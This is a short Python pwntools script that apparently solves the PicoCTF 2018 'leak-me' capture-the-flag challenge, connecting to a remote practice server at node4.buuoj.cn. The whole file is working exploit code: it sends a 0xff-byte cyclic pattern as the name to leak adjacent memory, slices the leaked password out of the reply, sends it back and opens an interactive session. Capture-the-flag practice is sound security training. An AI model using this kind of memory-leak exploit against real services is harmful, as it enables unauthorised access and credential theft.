from pwn import *

context(os = 'linux', arch = 'i386', log_level = 'debug')
# io = process('PicoCTF_2018_leak-me')
io = remote('node4.buuoj.cn', 29441)
# libc = ELF('/lib/x86_64-linux-gnu/libc.so.6')
# libc = ELF('libc-2.23.so')
elf = ELF('PicoCTF_2018_leak-me')

payload = cyclic(0xff)
io.sendafter('What is your name?\n', payload)
password = io.recvline()[0x106:-1]
io.sendline(password)
io.interactive()
